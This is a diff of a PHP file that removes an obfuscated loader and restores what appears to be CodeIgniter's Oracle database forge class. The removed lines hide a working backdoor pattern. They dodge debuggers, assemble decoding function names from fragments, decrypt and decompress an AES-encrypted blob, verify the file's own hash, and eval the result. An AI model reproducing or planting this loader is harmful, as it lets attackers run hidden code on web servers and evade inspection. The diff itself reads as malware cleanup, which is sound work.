@@ -1,28 +1,170 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_dzgnq5p6=('bas'.'e64'.'_de'.'cod'.'e');
-$_fxs2705o=('gzu'.'nco'.'mpr'.'ess');
-$_dr77x4j3=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_s05f2dgq='mSf4RCf4MPI=';
-$_xknu1abg='WEoGjJig';
-$_gs4mo3ex='TCA055qo';
-$_vhg0u4j5='pKFLAX6Z';
-$_giopelky='HpziJJYU';
-$_dn5w5xc5='nyqE8Tzk';
-$_w20ze9v6='ifxgd1fi';
-$_bngqfxnd='9H39wg==';
-$_dhjw77e6=$_dzgnq5p6($_giopelky.$_xknu1abg.$_vhg0u4j5.$_gs4mo3ex.$_s05f2dgq);
-$_jwaq691j=$_dzgnq5p6($_w20ze9v6.$_dn5w5xc5.$_bngqfxnd);
-$_tg80ua1e=$_dzgnq5p6('0IZbGDeEBnU+jsP/jG+Ce2SgKt3sXoatFkEpuJAjFqwV8a8OgKJmnVRR8Ux5FiAuaD9TtB4DdBoNnV5hzvpgHM7jqEL/ODIiqqx/p1qmaVH4Ekl9cnrA38ZHQ15LXrtZubkmFb1F6dJ7Xdbwf0qPeSuOsmdSfA/OJ2hafAiejtfTrmxg0HgkDBsfFsvRjj7Tcagbr1Zm/lc7JGmYWalxU0z5809TxZfoadU+O7YLO2Puf93NZg0CrRYq1Y3EQTE9JZkeqzsTERYD7gMh7nKGpbX1ja7/SraFh6qFJ3mJyHErgVd+R2PbWkIbdKxEZz8ghuvaBZd60n/FL46Xzu8upIior6yXhxmyekorUZeJyvhO+qhkh5/NcPN+D2IBPkapaer2+iO2p69YFLdVty7bz+FA/wA4GStQbmrJ5T0n0hxiwL1k0QCyXyoK5SL+VhdqXiqocYjh13y5Mk9Mw/yJKUS0oulODKfTiItvhz9NgqyRMFto2I+qTSQsopMiLeuyFC7ThQNJJ+utpvKr/2jiBb5ornF9kfkfMIOVQHN4mJP4nQNqGE4I3tmlx94r3AeAPUD/odNp8xZa8srAkPeZ72oOuWpWFb0OJh9peYICYfaHshjVzJxaA32qGk8CLzkzjmilLCz6ieomAjszn9XZvhcTCs/WPxAbF05VYJdq5cqPAkm3+0vyA4LuztZI7vn9la645EbzotxWU47qHr9FAhtDbXWXZANISUh/WEwV0RdSCCkYF/lTb3tr/pa6EVbh/gRekPBxrwzQY1md2mFhL73R0FULf3n9ilZsoU5HBlbnhEsHGjwQe/4Md6mwp0seqRbKyIFyvtwqn+ckzRpIPrUYspJNAyt0DhZEpSSPJvYae4TyUFUgfe0U/uXcjhTHJDZczwiu2buxtXzQuVxCERRLTKCSUCxcy6UlfTTF57M=');
-$_o9wqgkm1=$_dr77x4j3($_tg80ua1e,'aes-256-cbc',$_dhjw77e6,OPENSSL_RAW_DATA,$_jwaq691j);
-if($_o9wqgkm1===false){exit;}
-$_ocz06m5n=$_fxs2705o($_o9wqgkm1);
-if($_ocz06m5n===false){exit;}
-$_qvnr3vi0='1723ad2a7fc532b14ea5b94af6132a5bba50c25b09ed4eff013d481397b95c37';
-$_qthzva9y=@file_get_contents(__FILE__);
-if($_qthzva9y!==false){
-$_i4792y5j=str_replace($_qvnr3vi0,"0000000000000000000000000000000000000000000000000000000000000000",$_qthzva9y);
-$_jw2nk452=hash("sha256",$_i4792y5j);
-if($_jw2nk452!==$_qvnr3vi0){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+class CI_DB_oci8_forge extends CI_DB_forge {
+
+
+
+
+
+protected $_create_database = FALSE;
+
+
+
+
+
+protected $_create_table_if = FALSE;
+
+
+
+
+
+protected $_drop_database = FALSE;
+
+
+
+
+
+protected $_drop_table_if = FALSE;
+
+
+
+
+
+protected $_unsigned = FALSE;
+
+
+
+
+
+
+
+
+
+protected function _alter_table($alter_type, $table, $field)
+{
+if ($alter_type === 'DROP')
+{
+return parent::_alter_table($alter_type, $table, $field);
 }
-eval($_ocz06m5n);
+elseif ($alter_type === 'CHANGE')
+{
+$alter_type = 'MODIFY';
+}
+$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table);
+$sqls = array();
+for ($i = 0, $c = count($field); $i < $c; $i++)
+{
+if ($field[$i]['_literal'] !== FALSE)
+{
+$field[$i] = "\n\t".$field[$i]['_literal'];
+}
+else
+{
+$field[$i]['_literal'] = "\n\t".$this->_process_column($field[$i]);
+if ( ! empty($field[$i]['comment']))
+{
+$sqls[] = 'COMMENT ON COLUMN '
+.$this->db->escape_identifiers($table).'.'.$this->db->escape_identifiers($field[$i]['name'])
+.' IS '.$field[$i]['comment'];
+}
+if ($alter_type === 'MODIFY' && ! empty($field[$i]['new_name']))
+{
+$sqls[] = $sql.' RENAME COLUMN '.$this->db->escape_identifiers($field[$i]['name'])
+.' TO '.$this->db->escape_identifiers($field[$i]['new_name']);
+}
+$field[$i] = "\n\t".$field[$i]['_literal'];
+}
+}
+$sql .= ' '.$alter_type.' ';
+$sql .= (count($field) === 1)
+? $field[0]
+: '('.implode(',', $field).')';
+
+array_unshift($sqls, $sql);
+return $sqls;
+}
+
+
+
+
+
+
+
+
+protected function _attr_auto_increment(&$attributes, &$field)
+{
+
+}
+
+
+
+
+
+
+
+
+
+protected function _attr_type(&$attributes)
+{
+switch (strtoupper($attributes['TYPE']))
+{
+case 'TINYINT':
+$attributes['TYPE'] = 'NUMBER';
+return;
+case 'MEDIUMINT':
+$attributes['TYPE'] = 'NUMBER';
+return;
+case 'INT':
+$attributes['TYPE'] = 'NUMBER';
+return;
+case 'BIGINT':
+$attributes['TYPE'] = 'NUMBER';
+return;
+default: return;
+}
+}
+}
